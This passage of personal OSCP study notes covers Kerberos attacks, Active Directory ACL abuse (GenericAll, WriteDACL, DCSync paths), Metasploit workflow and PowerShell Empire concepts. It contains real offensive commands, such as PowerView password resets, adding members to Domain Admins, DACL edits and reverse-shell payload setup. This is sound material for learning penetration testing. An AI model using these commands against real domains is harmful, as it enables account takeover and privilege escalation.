Get-NetUser -SPN
```

Or:

```bash
impacket-GetUserSPNs corp.local/user:password -dc-ip <DC-IP>
```

---

## 16. AS-REP Roasting vs Kerberoasting

||AS-REP Roasting|Kerberoasting|
|---|---|---|
|Target|User account|Service account|
|Requirement|Preauthentication disabled|SPN|
|Ticket|AS-REP|TGS|
|Authentication stage|AS|TGS|
|Goal|Crack password offline|Crack service account password offline|

Memorize:

```text
AS-REP Roasting
→ AS-REP

Kerberoasting
→ TGS
```

---

## 17. Pass the Ticket

If an attacker obtains a valid Kerberos ticket, they may be able to use it to authenticate to services without knowing the user's plaintext password.

Concept:

```text
Stolen Ticket
     ↓
Use Ticket
     ↓
Service Authentication
```

This is fundamentally different from Pass the Hash:

```text
Pass the Hash
→ NTLM hash

Pass the Ticket
→ Kerberos ticket
```

---

## 18. Overpass the Hash

Overpass the Hash uses an NTLM hash to obtain Kerberos authentication material.

Conceptually:

```text
NTLM Hash
    ↓
Request Kerberos TGT
    ↓
TGT
    ↓
Kerberos Authentication
```

So:

```text
Pass the Hash
    ↓
NTLM authentication

Overpass the Hash
    ↓
NTLM hash → Kerberos
```

---

## 19. Silver Ticket

A **Silver Ticket** is a forged Kerberos service ticket.

It targets a specific service.

Concept:

```text
Service Account Secret
        +
       SPN
        ↓
Forged TGS
        ↓
Specific Service
```

Example:

```text
cifs/server01.corp.local
```

Important:

```text
Silver Ticket
→ TGS
→ Specific service
```

---

## 20. Golden Ticket

A **Golden Ticket** is a forged Kerberos TGT.

It is associated with the domain's:

```text
krbtgt
```

secret.

Concept:

```text
krbtgt Secret
     ↓
Forge TGT
     ↓
Kerberos Authentication
     ↓
Domain Resources
```

Difference:

```text
Golden Ticket
→ Forged TGT
→ Domain-level Kerberos trust

Silver Ticket
→ Forged TGS
→ Specific service
```

---

## 21. Kerberos Delegation

Delegation allows a service to act on behalf of a user when accessing another service.

Important types:

```text
Unconstrained Delegation
Constrained Delegation
Resource-Based Constrained Delegation (RBCD)
```

These can become important privilege-escalation and lateral-movement paths in AD.

---

## 22. Unconstrained Delegation

A computer configured for unconstrained delegation can potentially obtain reusable Kerberos credentials/tickets when users authenticate to it.

Concept:

```text
Privileged User
      ↓
Authenticates to delegated host
      ↓
Kerberos credentials available
      ↓
Potential credential abuse
```

During enumeration, identify computers configured for delegation.

---

## 23. Constrained Delegation

Constrained delegation restricts which services a particular account can delegate authentication to.

Concept:

```text
User
 ↓
Service A
 ↓
Allowed Service B
```

The restriction is intended to limit where delegated authentication can be used.

---

## 24. Resource-Based Constrained Delegation

RBCD is configured on the **resource/service being accessed**.

Conceptually:

```text
Compromised Computer Account
          ↓
Allowed to delegate
          ↓
Target Computer
```

If an attacker gains the necessary control over the target computer object's delegation configuration, RBCD can become an attack path.

BloodHound can help identify relevant relationships.

---

## 25. Kerberos Tickets on Windows

To inspect cached Kerberos tickets:

```cmd
klist
```

Example:

```text
Cached Tickets:
    krbtgt/CORP.LOCAL
    cifs/server01.corp.local
    ldap/dc01.corp.local
```

This can reveal which Kerberos services the current logon session has authenticated to.

---

## 26. Useful Enumeration

List SPNs:

```cmd
setspn -Q */*
```

Find SPNs for a user:

```cmd
setspn -L username
```

PowerView:

```powershell
Get-NetUser -SPN
```

PowerShell AD:

```powershell
Get-ADUser -Filter {ServicePrincipalName -like "*"} `
-Properties ServicePrincipalName
```

---

## 27. Kerberos Time Synchronization

Kerberos is sensitive to clock differences.

If the client and Domain Controller have significantly different times, authentication can fail.

Check:

```cmd
w32tm /query /status
```

Linux:

```bash
date
```

When troubleshooting Kerberos:

```text
DNS
+
Time
+
Domain Name
+
Credentials
```

should be among the first things you verify.

---

## 28. Kerberos DNS Dependency

Kerberos relies heavily on correct DNS configuration.

Check:

```bash
nslookup dc01.corp.local
```

And:

```bash
nslookup -type=SRV _kerberos._tcp.corp.local
```

Useful records include:

```text
_kerberos._tcp
_kerberos._udp
_ldap._tcp
```

Incorrect DNS can cause Kerberos authentication problems even when credentials are correct.

---

## 29. NTLM vs Kerberos

|Feature|NTLM|Kerberos|
|---|---|---|
|Authentication|Challenge-response|Tickets|
|Default AD protocol|Legacy/fallback|Primary|
|Uses tickets|No|Yes|
|Uses SPNs|No|Yes|
|Port|Various|88|
|Pass the Hash|Yes|Not directly|
|Kerberoasting|No|Yes|
|AS-REP Roasting|No|Yes|
|Pass the Ticket|No|Yes|

Mental model:

```text
NTLM
→ Hash-based authentication

Kerberos
→ Ticket-based authentication
```

---

## 30. OSCP Troubleshooting Checklist

If Kerberos authentication fails:

```text
[ ] Correct domain name?
[ ] Correct Domain Controller?
[ ] DNS resolving correctly?
[ ] Correct username?
[ ] Correct password/hash?
[ ] System time synchronized?
[ ] Kerberos port 88 reachable?
[ ] Correct SPN?
[ ] Valid TGT?
[ ] Valid service ticket?
```

Check port:

```bash
nmap -p 88 <DC-IP>
```

Check DNS:

```bash
nslookup <DC-hostname>
```

Check tickets:

```cmd
klist
```

---

## 31. OSCP Attack Mapping

Memorize this table:

|Attack|Kerberos Object / Concept|
|---|---|
|AS-REP Roasting|AS-REP|
|Kerberoasting|TGS|
|Pass the Ticket|Existing Kerberos ticket|
|Overpass the Hash|NTLM hash → Kerberos|
|Silver Ticket|Forged TGS|
|Golden Ticket|Forged TGT|
|Delegation attacks|Kerberos delegation|

---

## 32. One-Minute Revision

```text
KDC
│
├── AS
│    │
│    ├── AS-REQ
│    └── AS-REP
│          ↓
│         TGT
│
└── TGS
     │
     ├── TGS-REQ
     └── TGS-REP
           ↓
       Service Ticket
           ↓
        AP-REQ
           ↓
        Service
```

### Remember:

```text
TGT
→ Used to request service tickets

TGS
→ Service ticket

SPN
→ Identifies a service

AS-REP Roasting
→ Attack accounts without preauthentication

Kerberoasting
→ Attack SPN/service accounts

Silver Ticket
→ Forged TGS

Golden Ticket
→ Forged TGT

Pass the Ticket
→ Reuse Kerberos ticket

Overpass the Hash
→ NTLM hash → Kerberos
```

### Core OSCP mental model

```text
PASSWORD
   ↓
AS-REQ
   ↓
AS-REP
   ↓
TGT
   ↓
TGS-REQ + SPN
   ↓
TGS-REP
   ↓
SERVICE TICKET
   ↓
AP-REQ
   ↓
SERVICE ACCESS
```
# ==Active Directory - Full Control== 
![[active-directory-security 2.png]]
## 1. What is Full Control?

**Full Control** in Active Directory usually refers to the `GenericAll` permission.

If an account has `GenericAll` over an AD object, it can perform essentially any operation allowed against that object. The exact abuse depends on whether the target is a **user, group, computer, GPO, OU, or domain**.

### Important BloodHound edge

```
Attacker
   |
   | GenericAll
   v
Target Object
```

Think of:

```
GenericAll = Full Control
```

---

## 2. GenericAll Over a User

This is one of the most useful cases.

If you have:

```
GenericAll → User
```

you can generally take over the user account by changing its password.

### PowerView enumeration

```
Get-ObjectAcl -SamAccountName targetuser -ResolveGUIDs |
    ? {$_.ActiveDirectoryRights -eq "GenericAll"}
```

Or with newer PowerView-style enumeration:

```
Get-DomainObjectAcl -Identity targetuser -ResolveGUIDs
```

### Password takeover

```
$Password = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force

Set-DomainUserPassword -Identity targetuser `
    -AccountPassword $Password
```

Then authenticate as:

```
DOMAIN\targetuser
```

### Alternative: Targeted Kerberoasting

`GenericAll` over a user can also allow modification of the user's attributes, including setting an SPN and performing targeted Kerberoasting.

Conceptually:

```
GenericAll
    ↓
Modify user
    ↓
Set SPN
    ↓
Request TGS
    ↓
Offline crack
    ↓
User credentials
```

---

## 3. GenericAll Over a Group

If you have:

```
GenericAll → Group
```

you can modify the group's membership.

For example:

```
GenericAll
     ↓
Domain Admins
     ↓
Add attacker
     ↓
Domain Admin
```

### PowerView

```
Add-DomainGroupMember `
    -Identity "Domain Admins" `
    -Members attacker
```

Verify:

```
Get-DomainGroupMember "Domain Admins"
```

This is one of the cleanest AD privilege-escalation paths.

---

## 4. GenericAll Over a Computer

A computer object is different from a user or group.

Potential abuse includes:

- Resource-Based Constrained Delegation (**RBCD**)
- LAPS-related access, depending on configuration
- Modification of the computer object's permissions
- Other attacks involving writable computer attributes

BloodHound specifically documents `GenericAll` over a computer as potentially usable for RBCD or accessing LAPS-related information.

Typical attack concept:

```
GenericAll
     ↓
Computer Object
     ↓
RBCD
     ↓
Impersonate privileged user
     ↓
Access target computer
```

### Important

Do **not** assume:

```
GenericAll on Computer = instant Domain Admin
```

The actual impact depends on the environment and available delegation/configuration.

---

## 5. GenericAll Over a Domain

This is extremely powerful.

If you have:

```
GenericAll
     ↓
Domain Object
```

you can potentially grant yourself the replication permissions required for **DCSync**.

Conceptually:

```
GenericAll
      ↓
Domain object
      ↓
DS-Replication-Get-Changes
+
DS-Replication-Get-Changes-All
      ↓
DCSync
      ↓
Domain credentials
```

BloodHound documents `GenericAll` over a domain as providing the replication rights needed for DCSync.

---

## 6. GenericAll Over a GPO

A GPO controls configuration applied to users/computers within its scope.

Therefore:

```
GenericAll
     ↓
GPO
     ↓
Modify GPO
     ↓
GPO applies to target
     ↓
Code/configuration execution
```

The actual impact depends on:

- Which computers/users receive the GPO
- GPO links
- Security filtering
- Delegation
- What you modify inside the GPO

BloodHound documents GPO modification as an abuse path for `GenericAll`.

---

## 7. GenericAll Over an OU

An OU is especially interesting because permissions can be inherited by objects underneath it.

Conceptually:

```
GenericAll
     ↓
OU
     ↓
Inherited ACE
     ↓
Users / Computers / Groups
     ↓
Takeover
```

You can potentially create an inheritable ACE that gives control over descendant objects.

For OSCP, remember:

```
OU control
    =
potential control over descendants
```

The exact impact depends heavily on inheritance configuration.

---

## 8. GenericAll vs Other Dangerous ACLs

You should memorize this table:

|Permission|Meaning|Typical Abuse|
|---|---|---|
|**GenericAll**|Full control|Take over object|
|**GenericWrite**|Write attributes|SPN / Shadow Credentials / RBCD depending on object|
|**WriteDACL**|Modify DACL|Grant yourself permissions|
|**WriteOwner**|Change owner|Take ownership → modify DACL|
|**ForceChangePassword**|Change password|User takeover|
|**AddMember / WriteMembers**|Modify group membership|Privilege escalation|
|**AllExtendedRights**|Extended rights|Password reset / other object-specific rights|
|**ReadLAPSPassword**|Read LAPS password|Local administrator access|

These relationships are central to BloodHound-based AD attack-path analysis.

---

## 9. WriteDACL → GenericAll

This is extremely important for the OSCP.

Suppose:

```
Attacker
   |
   | WriteDACL
   v
Target
```

`WriteDACL` allows you to modify the target's DACL.

Therefore you can potentially grant yourself:

```
GenericAll
```

Result:

```
WriteDACL
    ↓
Modify DACL
    ↓
Grant GenericAll
    ↓
Full Control
    ↓
Object-specific takeover
```

BloodHound describes `WriteDACL` as the ability to grant yourself additional privileges on the target object.

### PowerView

```
Add-DomainObjectAcl `
    -TargetIdentity "targetuser" `
    -PrincipalIdentity "attacker" `
    -Rights All
```

Then treat the resulting access as `GenericAll`.

---

## 10. WriteOwner → WriteDACL → GenericAll

Another important chain:

```
WriteOwner
     ↓
Become Owner
     ↓
Modify DACL
     ↓
WriteDACL
     ↓
Grant GenericAll
     ↓
Take Over
```

The important distinction is:

```
WriteOwner ≠ automatically GenericAll
```

You normally need to use ownership to obtain the ability to manipulate the DACL, subject to the object's ACL/protection configuration.

---

## 11. GenericWrite

`GenericWrite` is **not** equivalent to GenericAll.

```
GenericAll
    = Full control

GenericWrite
    = Write certain attributes
```

For example, on a user:

```
GenericWrite
      ↓
Writable attribute
      ↓
SPN modification
      ↓
Targeted Kerberoasting
```

Or depending on the object and configuration:

```
GenericWrite
      ↓
msDS-KeyCredentialLink
      ↓
Shadow Credentials
```

Or on a computer:

```
GenericWrite
      ↓
Writable delegation-related attribute
      ↓
RBCD
```

The exact writable attribute matters.

---

## 12. BloodHound Methodology

For OSCP, don't just search for:

```
GenericAll
```

Look for the entire ACL attack chain.

### Important edges

```
GenericAll
GenericWrite
WriteDACL
WriteOwner
ForceChangePassword
AddMember
AllExtendedRights
Owns
```

Then ask:

```
Who controls this object?
        ↓
What object is controlled?
        ↓
What does that permission allow?
        ↓
Can I chain it?
        ↓
Does the chain reach Domain Admin?
```

BloodHound is particularly useful because permissions inherited through groups and nested relationships may not be obvious from checking only the attacker's direct SID.

---

## 13. Example Attack Path

A classic OSCP-style chain:

```
Low Privileged User
        |
        | GenericAll
        v
     Helpdesk
        |
        | Member of
        v
   IT Admins
        |
        | GenericAll
        v
   Domain Admins
        |
        v
   Domain Admin
```

Another:

```
User
 |
 | WriteDACL
 v
Target Group
 |
 | Grant GenericAll
 v
Target Group
 |
 | Add attacker
 v
Privileged Group
```

Another:

```
User
 |
 | GenericAll
 v
Service Account
 |
 | Set SPN
 v
Targeted Kerberoasting
 |
 v
Crack TGS
 |
 v
Credentials
```

---

## 14. Enumeration Cheat Sheet

### PowerView

```
Get-DomainObjectAcl -Identity target -ResolveGUIDs
```

Search for dangerous rights:

```
Get-DomainObjectAcl -ResolveGUIDs |
    ? {$_.ActiveDirectoryRights -match `
    "GenericAll|GenericWrite|WriteDacl|WriteOwner"}
```

Group membership:

```
Get-DomainGroupMember "Domain Admins"
```

Domain information:

```
Get-Domain
```

Users:

```
Get-DomainUser
```

Computers:

```
Get-DomainComputer
```

---

## 15. Linux / Impacket

Modern AD assessment can also use Impacket tooling.

For example, `dacledit.py` can be used to inspect and modify DACLs when you have the necessary permissions:

```
dacledit.py -action read \
    -target "Domain Admins" \
    DOMAIN/user:'Password' \
    -dc-ip 10.10.10.10
```

The key OSCP concept is understanding **why** the ACL is exploitable rather than memorizing one tool's syntax.

---

## 16. Full Control Decision Tree

```
              GenericAll
                  |
        +---------+---------+
        |         |         |
      User      Group    Computer
        |         |         |
   Reset PW   Add Member   RBCD/LAPS
   Set SPN
        |
   Takeover


              GenericAll
                  |
        +---------+---------+
        |         |
       GPO        OU
        |         |
   Modify GPO   Inheritance
                  |
             Descendants


              GenericAll
                  |
                Domain
                  |
             Replication
                  |
                DCSync
```

---

## 17. What to Memorize for OSCP

### The most important relationships:

```
GenericAll
= Full Control

WriteDACL
= Modify permissions
= Grant yourself GenericAll

WriteOwner
= Change owner
→ potentially obtain DACL control

GenericWrite
= Modify writable attributes

GenericAll → User
= Password takeover / attribute abuse

GenericAll → Group
= Add member

GenericAll → Computer
= RBCD / configuration-dependent abuse

GenericAll → Domain
= DCSync-capable replication rights

GenericAll → GPO
= Modify policy

GenericAll → OU
= Potential inherited control
```

### The key mindset

Don't think:

```
"I found GenericAll."
```

Think:

```
"I have control over WHAT?
What can this object do?
Who/what does it control?
Can I chain this into higher privileges?"
```

That is the important **Active Directory ACL / Full Control** methodology for OSCP.
![[Pasted image 20261005062241.png]]
# ==Metasploit==

![[metasploitintro-1785241448337.png]]
> **OSCP focus:** Metasploit is important, but you should understand what it is doing rather than depending on it. In the OSCP exam, Metasploit/Meterpreter usage is restricted to **one chosen target**; once used, you cannot use it against another machine.

## 1. What is Metasploit?

**Metasploit Framework (MSF)** is an open-source penetration-testing framework used to:

- Identify and exploit known vulnerabilities
- Run auxiliary scanners
- Deliver payloads
- Obtain interactive sessions
- Perform post-exploitation
- Pivot through compromised systems
- Automate repetitive exploitation tasks

The main interface is:

```
msfconsole
```

---

## 2. Metasploit Architecture

The most important module types are:

|Module|Purpose|
|---|---|
|`exploit`|Exploits a vulnerability|
|`auxiliary`|Scanning, enumeration, brute-force, information gathering|
|`payload`|Code executed after successful exploitation|
|`post`|Post-exploitation actions|
|`encoder`|Encodes payloads|
|`nop`|Generates NOP instructions|
|`evasion`|Attempts to evade security products|

Metasploit's official documentation describes Auxiliary, Exploit, Payload and Post as the core module types you'll use most often.

---

## 3. Starting Metasploit

```
msfconsole
```

Useful commands:

```
help
?
version
exit
quit
```

---

## 4. Searching for Modules

```
search <keyword>
```

Examples:

```
search smb
search apache
search vsftpd
search type:exploit smb
search type:auxiliary scanner
```

You can also filter searches:

```
search type:exploit name:ms17_010
search type:auxiliary smb
```

Metasploit's `search` command can search by module type and other attributes.

---

## 5. Using a Module

Basic workflow:

```
search <vulnerability>
use <module>
info
show options
set RHOSTS <TARGET>
set RPORT <PORT>
run
```

Example:

```
use auxiliary/scanner/smb/smb_version
show options
set RHOSTS 10.10.10.10
run
```

For an exploit:

```
use exploit/...
show options
set RHOSTS 10.10.10.10
set LHOST tun0
set LPORT 4444
run
```

---

## 6. Important Metasploit Commands

### Module interaction

```
use <module>
info
show options
show payloads
show targets
show advanced
back
```

### Configuration

```
set RHOSTS 10.10.10.10
set RPORT 445
set LHOST tun0
set LPORT 4444
unset RPORT
setg RHOSTS 10.10.10.10
```

`set` configures the current module, while `setg` configures a global datastore value.

### Execution

```
run
exploit
check
```

`exploit` and `run` are commonly interchangeable depending on the module.

---

## 7. RHOSTS vs LHOST

This is extremely important.

### RHOSTS

**Remote Host(s)** — the target.

```
RHOSTS = 10.10.10.10
```

### LHOST

**Local Host** — your attacking machine.

For OSCP labs this is commonly your VPN interface:

```
ip addr show tun0
```

Then:

```
set LHOST <tun0-IP>
```

Example:

```
set RHOSTS 10.10.10.10
set LHOST 10.10.14.5
```

---

## 8. Auxiliary Modules

Auxiliary modules generally **do not exploit the target**. They perform tasks such as scanning, enumeration, login testing and information gathering.

Examples:

```
auxiliary/scanner/portscan/tcp
auxiliary/scanner/smb/smb_version
auxiliary/scanner/smb/smb_login
auxiliary/scanner/ftp/ftp_version
auxiliary/scanner/http/http_version
auxiliary/scanner/http/title
```

Example:

```
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.10.10.10
run
```

---

## 9. Exploit Modules

Exploit modules contain code designed to exploit a particular vulnerability.

Typical workflow:

```
search <service/version>
use exploit/<module>
info
show options
set RHOSTS <TARGET>
show payloads
set PAYLOAD <payload>
run
```

Example structure:

```
exploit/windows/smb/<vulnerability>
```

An exploit normally needs at least the target and, depending on the exploit/payload, a local callback configuration.

---

## 10. Payloads

A **payload** is the code executed after successful exploitation.

Common payload concepts:

- Reverse shell
- Bind shell
- Meterpreter
- Command shell

Example:

```
windows/x64/meterpreter/reverse_tcp
```

Breakdown:

```
windows     → platform
x64         → architecture
meterpreter → stage
reverse_tcp → stager
```

Metasploit supports both **staged** and **single/non-staged** payloads.

---
![[Pasted image 20261005191107.png]]
## 11. Staged vs Non-Staged Payloads

### Staged

Example:

```
windows/x64/meterpreter/reverse_tcp
```

The payload is delivered in multiple parts:

```
stager → connects back
stage  → delivers the larger payload
```

### Non-staged

Example:

```
windows/x64/meterpreter_reverse_tcp
```

The payload is delivered as one complete payload.

**OSCP tip:** Know the difference because payload selection can determine whether an exploit works.

---

## 12. Meterpreter

Meterpreter is an advanced Metasploit payload that provides an interactive session after successful exploitation.

After obtaining a session:

```
meterpreter >
```

Useful commands:

```
help
sysinfo
getuid
pwd
ls
cd
download <file>
upload <file>
shell
background
sessions
```

System information:

```
sysinfo
```

Current user:

```
getuid
```

Spawn a normal command shell:

```
shell
```

Background the session:

```
background
```

---

## 13. Sessions

List sessions:

```
sessions
```

Interact with a session:

```
sessions -i 1
```

Background:

```
background
```

Kill a session:

```
sessions -k 1
```

This becomes especially useful when working with multiple shells during a lab.

---

## 14. Post-Exploitation

Post modules operate **after you already have a session**.

Examples include:

```
post/windows/gather/...
post/linux/gather/...
post/multi/...
```

Search:

```
search type:post
```

Example workflow:

```
sessions
sessions -i 1
background

search type:post
use post/...
show options
set SESSION 1
run
```

Post modules are designed for gathering information and performing actions against an already compromised system.

---

## 15. Exploit → Payload → Session

The core Metasploit concept:

```
Vulnerability
      ↓
   Exploit
      ↓
   Payload
      ↓
   Session
      ↓
Post-Exploitation
```

Example:

```
Target vulnerable to SMB vulnerability
              ↓
       Exploit module
              ↓
    Meterpreter payload
              ↓
       Meterpreter
              ↓
      Post-exploitation
```

---

## 16. `check`

Some exploits support:

```
check
```

This attempts to determine whether the target appears vulnerable without fully exploiting it.

**Important for OSCP:** because Metasploit usage is restricted to one exam target, do **not** use Metasploit's `check` against multiple potential exam machines before choosing your Metasploit target. OffSec explicitly includes `check` in the restriction.

---

## 17. `show payloads`

After selecting an exploit:

```
use exploit/...
show payloads
```

This displays compatible payloads.

Then:

```
set PAYLOAD <payload>
```

Example:

```
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

---

## 18. Target Selection

Some exploits support multiple target configurations.

```
show targets
```

Then:

```
set TARGET <number>
```

Always read:

```
info
```

before blindly selecting a target.

---

## 19. Datastore

Metasploit stores module configuration in a **datastore**.

Example:

```
set RHOSTS 10.10.10.10
set RPORT 445
set LHOST 10.10.14.5
```

View configuration:

```
show options
```

Global configuration:

```
setg LHOST tun0
```

Remove:

```
unset LHOST
```

---

## 20. Resource Scripts

Resource scripts allow you to automate a sequence of Metasploit commands.

Example:

```
msfconsole -r script.rc
```

A resource file could contain:

```
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.10.10.10
run
```

OffSec's current OSCP body of knowledge specifically includes **resource scripts and automating Metasploit**.

---

## 21. Pivoting

Metasploit can also be used for pivoting through compromised hosts.

Conceptually:

```
Kali
  |
  v
Compromised Host A
  |
  v
Internal Network
  |
  +---- Host B
  +---- Host C
```

Common concepts:

```
sessions
route
autoroute
portfwd
```

However, **do not rely on Metasploit pivoting for the OSCP exam**, because Metasploit/Meterpreter cannot be used across multiple exam targets.

---

## 22. Encoders

Encoders transform payload bytes.

Example:

```
show encoders
```

Historically, encoders were often associated with bypassing bad characters or simple signature detection. Modern AV/EDR should **not** be assumed to be bypassed merely because a payload is encoded.

For OSCP, understand the concept rather than treating encoders as an AV bypass solution.

---

## 23. NOPs

NOP = **No Operation**

NOP modules generate sequences of instructions commonly used with exploit development and buffer overflows.

```
show nops
```

They're mainly relevant when constructing certain exploit payload layouts.

---

## 24. Important OSCP Workflow

Don't start with:

```
msfconsole
search exploit
run
```

Instead:

```
1. Nmap
   ↓
2. Service enumeration
   ↓
3. Identify version/application
   ↓
4. Search for vulnerability
   ↓
5. Validate vulnerability
   ↓
6. Search Metasploit
   ↓
7. Read info
   ↓
8. Select exploit
   ↓
9. Select compatible payload
   ↓
10. Configure options
   ↓
11. Exploit
   ↓
12. Obtain session
   ↓
13. Post-exploitation
```

The OSCP emphasizes vulnerability identification, exploitation, privilege escalation and Active Directory, with Metasploit appearing specifically in the PEN-200 material for upgrading to interactive shells and post-exploitation.

---

## 25. Commands You Should Memorize

```
msfconsole

search <keyword>
use <module>
info
show options
show payloads
show targets
show advanced

set RHOSTS <IP>
set RPORT <PORT>
set LHOST <IP>
set LPORT <PORT>
set PAYLOAD <payload>

setg <option> <value>
unset <option>

check
run
exploit

sessions
sessions -i <ID>
background

shell

route
portfwd

back
exit
```

---

## 26. OSCP Exam Restrictions — **Critical**

For the current OSCP exam:

- You may use **Auxiliary, Exploit and Post modules** against **one chosen target**.
- You may use the **Meterpreter payload** against that same target.
- You cannot test Metasploit/Meterpreter against multiple machines before choosing your target.
- `check` counts as Metasploit usage.
- Metasploit cannot be used for pivoting because that would involve multiple targets.

Therefore, your practical strategy should be:

```
Enumerate manually
       ↓
Identify likely vulnerable target
       ↓
Choose ONE target for Metasploit
       ↓
Use Metasploit only there
       ↓
Do the rest manually
```

---

## 27. What You Actually Need to Know for OSCP

### Must know

- `msfconsole`
- Module types
- `search`
- `use`
- `info`
- `show options`
- `show payloads`
- `set`
- `setg`
- `RHOSTS`
- `RPORT`
- `LHOST`
- `LPORT`
- `run` / `exploit`
- `check`
- Sessions
- Meterpreter basics
- Staged vs non-staged payloads
- Auxiliary modules
- Exploit modules
- Post modules
- Resource scripts
- Metasploit exam restrictions

### Should understand

```
Exploit ≠ Payload
Payload ≠ Session
Meterpreter ≠ Exploit
Auxiliary ≠ Exploit
```

The framework is essentially:

```
             METASPLOIT
                 │
     ┌───────────┼───────────┐
     ↓           ↓           ↓
 Auxiliary    Exploit      Post
                 │
                 ↓
              Payload
                 │
                 ↓
              Session
                 │
                 ↓
         Post-Exploitation
```

**Official references:** [Metasploit Documentation](https://docs.metasploit.com/?utm_source=chatgpt.com) and [OffSec OSCP+ Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide?utm_source=chatgpt.com).


# ==Powershell Empire==
![[empire_logo.png|531]]
## Overview

**PowerShell Empire** is a post-exploitation and adversary-emulation framework originally focused on PowerShell-based Windows agents. Modern Empire has expanded to support multiple agent types and a modular server/client architecture.

For OSCP, the important concept is **not memorizing Empire commands**, but understanding how a post-exploitation framework manages:

- Listeners
- Stagers
- Agents
- Modules
- Post-exploitation
- Command execution
- File transfer
- Situational awareness
- Credential access
- Privilege escalation

> **Important:** The original `EmpireProject/Empire` repository was archived in 2020. Current Empire development is associated with **BC-SECURITY/Empire**.

---

## 1. Empire Architecture

The basic workflow is:

```
Operator
   │
   ▼
Empire Server
   │
   ├── Listeners
   │
   ├── Stagers
   │
   ├── Agents
   │
   └── Modules
          │
          ▼
       Target Host
```

### Main Components

|Component|Purpose|
|---|---|
|**Server**|Central Empire backend|
|**Client**|Interface used by the operator|
|**Listener**|Waits for agent communications|
|**Stager**|Initial code used to establish an agent|
|**Agent**|Post-exploitation session on the target|
|**Module**|Performs a specific post-exploitation task|
|**Plugin**|Extends Empire functionality|
|**Starkiller**|GUI client for Empire|

Modern Empire supports a server/client architecture and includes both CLI and GUI access through Starkiller.

---

## 2. Listeners

A **listener** defines how Empire communicates with an agent.

Common concepts include:

```
Target → Listener → Empire Server
```

Listeners can provide communication over mechanisms such as:

- HTTP/HTTPS
- Malleable HTTP
- Other supported transports depending on the Empire version

The listener configuration generally includes things such as:

```
Host
Port
Name
WorkingHours
KillDate
Delay
Jitter
```

Empire's documentation describes listeners as the first major step in establishing agent communications.

### Important OSCP Concept

**Listener ≠ Agent**

The listener is the communication endpoint.

The agent is the session established on the compromised machine.

---

## 3. Stagers

A **stager** is responsible for establishing the initial connection and obtaining/starting the agent.

Conceptually:

```
Stager
   ↓
Connect to Listener
   ↓
Initial communication
   ↓
Agent established
   ↓
Post-exploitation
```

Empire supports modular stagers and can generate different types depending on the target and listener configuration.

### Stager vs Agent

**Stager**

```
Initial execution
      ↓
Establish communication
      ↓
Load/start agent
```

**Agent**

```
Persistent post-exploitation session
      ↓
Commands
Modules
File operations
Information gathering
```

---

## 4. Agents

An **agent** represents an active post-exploitation session.

After an agent checks in, Empire can interact with it and assign tasks.

Typical agent capabilities include:

- Execute commands
- Browse directories
- Upload files
- Download files
- Execute modules
- Gather system information
- Perform post-exploitation tasks

Empire creates agent-specific directories/logs for managing downloaded files and module results.

Useful conceptual commands include:

```
agents
interact <agent>
info
kill <agent>
```

The exact command syntax can vary between Empire versions.

---

## 5. Modules

Modules are one of the most important Empire concepts for OSCP.

A module performs a specific task against an agent.

Examples include:

```
Situational Awareness
Privilege Escalation
Credential Access
Lateral Movement
Persistence
Collection
```

Empire allows operators to search modules and execute them against an agent.

Example workflow:

```
Agent
  ↓
Select Module
  ↓
Configure Options
  ↓
Execute
  ↓
Receive Results
```

---

## 6. Situational Awareness

After obtaining a session, the first objective is usually **enumeration**.

Important information includes:

### System

```
Hostname
Username
OS version
Architecture
Processes
Services
Installed software
Environment variables
```

### Network

```
IP addresses
Network interfaces
Routing table
DNS configuration
Connections
```

### Active Directory

```
Domain
Domain users
Domain groups
Domain controllers
Computers
Shares
Trust relationships
```

This information helps determine the next attack path.

---

## 7. PowerView

Empire historically integrated PowerView functionality for Windows/AD reconnaissance.

PowerView can assist with discovering:

```
Users
Groups
Computers
Domains
Shares
Sessions
ACLs
Trust relationships
```

Example concept:

```
Compromised Windows Host
          ↓
      PowerView
          ↓
     AD Enumeration
          ↓
 Identify Attack Path
```

For OSCP, understand **what information AD enumeration provides**, rather than memorizing every PowerView function.

---

## 8. Credential Access

Empire has historically included modules/tools for credential-related operations.

Commonly encountered tooling includes:

- **Mimikatz**
- Credential enumeration
- Token-related operations
- Kerberos-related operations

Modern Empire documentation lists integrations such as **Mimikatz, Rubeus, Certify, Seatbelt, and SharpSploit** among its modules/tools.

### Mimikatz

Mimikatz is particularly important in Windows/AD post-exploitation.

It can be used for various credential and authentication-related operations, including extracting or manipulating Windows authentication material depending on the privileges and environment.

For OSCP, understand concepts such as:

```
Credentials
NTLM hashes
Kerberos tickets
Tokens
LSASS
Pass-the-Hash
Pass-the-Ticket
```

---

## 9. Privilege Escalation

Empire can assist with post-exploitation enumeration that helps identify privilege-escalation opportunities.

Typical workflow:

```
Low-Privilege Agent
        ↓
System Enumeration
        ↓
Identify Misconfiguration
        ↓
Privilege Escalation
        ↓
High-Privilege Agent
```

Examples of things to investigate:

```
Services
Scheduled Tasks
Weak permissions
Unquoted service paths
Stored credentials
Token privileges
AlwaysInstallElevated
Misconfigured applications
```

Empire is a **framework**, not a replacement for understanding the underlying Windows privilege-escalation technique.

---

## 10. File Operations

Agents can perform basic file operations such as:

```
Upload
Download
Directory navigation
File execution
```

This is useful for moving tools/scripts between the attacker machine and target.

Empire's agent interface specifically supports directory navigation and upload/download functionality.

---

## 11. Command Execution

An Empire agent can be tasked to execute commands on the target.

Conceptually:

```
Empire
   ↓
Agent
   ↓
Task
   ↓
Target executes task
   ↓
Result
   ↓
Empire
```

This makes Empire different from a simple reverse shell: it provides an organized **post-exploitation management layer** around the session.

---

## 12. Plugins

Empire supports plugins that extend the framework.

Conceptually:

```
Empire Core
     │
     ├── Modules
     ├── Agents
     ├── Listeners
     └── Plugins
```

Plugins can provide additional functionality beyond the built-in framework.

---

## 13. Starkiller

**Starkiller** is the graphical interface for Empire.

Instead of interacting exclusively through the CLI:

```
Empire CLI
```

operators can use:

```
Starkiller
    ↓
Empire API
    ↓
Empire Server
```

The modern Empire project describes Starkiller as a GUI application that interfaces with the Empire server through its API.

---

## 14. Empire vs Meterpreter

|Feature|Empire|Meterpreter|
|---|---|---|
|Main ecosystem|PowerShell/Windows + multiple agents|Metasploit|
|Post-exploitation|Yes|Yes|
|Agents/sessions|Yes|Yes|
|Modules|Yes|Yes|
